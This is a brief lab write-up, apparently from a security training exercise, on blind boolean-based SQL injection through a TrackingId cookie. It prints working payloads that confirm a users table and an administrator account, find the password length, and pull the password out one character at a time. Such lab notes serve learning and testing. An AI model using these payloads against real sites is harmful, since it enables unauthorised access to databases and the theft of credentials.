# Conditional responses
## Lab
Check table.
```sql
TrackingID=<cookie>' AND (select 'a' from users Limit 1)='a
```
This returns TRUE

Check User.
```SQL
TrackingId=<cookie>' AND (select 'a' from users where username='administrator')='a
```
Also TRUE

Now to brute force the password.
First guess the length
```SQL
TrackingId=<cookie>' AND (select 'a' from users where username='administrator' AND length(password)>30)='a
```
Using boolean logic you find out the length is 20.

Payload
```sql
TrackingId=<cookie>' AND (select substring(password,<index>,1) from users where username='administrator')>'a
```
It works!
Wrote a python script cause doing it in burp won't do binary search.
# Conditional Errors
pwd length =20
script works :)